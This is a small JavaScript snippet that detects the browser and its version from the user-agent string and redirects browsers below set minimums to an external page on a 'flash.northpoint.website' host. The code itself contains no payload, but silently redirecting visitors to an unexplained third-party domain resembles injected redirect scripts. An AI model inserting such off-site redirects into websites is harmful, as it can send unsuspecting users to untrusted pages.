(function() {
  const minVersions = {
    chrome: 63,
    firefox: 67,
    safari: 11.1,
    edge: 79
  };

  function detectBrowser() {
    const ua = navigator.userAgent;
    let name = "unknown";
    let version = 0;

    if (/Edg\/(\d+)/.test(ua)) {
      name = "edge";
      version = parseFloat(RegExp.$1);
    } else if (/Chrome\/(\d+)/.test(ua) && !/Edg\//.test(ua)) {
      name = "chrome";
      version = parseFloat(RegExp.$1);
    } else if (/Firefox\/(\d+)/.test(ua)) {
      name = "firefox";
      version = parseFloat(RegExp.$1);
    } else if (/Version\/(\d+(\.\d+)?).*Safari\//.test(ua)) {
      name = "safari";
      version = parseFloat(RegExp.$1);
    }

    return { name, version };
  }

  function checkBrowser() {
    const browser = detectBrowser();
    const min = minVersions[browser.name];
    const redirectUrl = "https://flash.northpoint.website/426.html"; // change this if needed

    if (!min) return; // Unknown browser → let it pass

    if (browser.version < min) {
      window.location.href = redirectUrl;
    }
  }

  checkBrowser();
})();
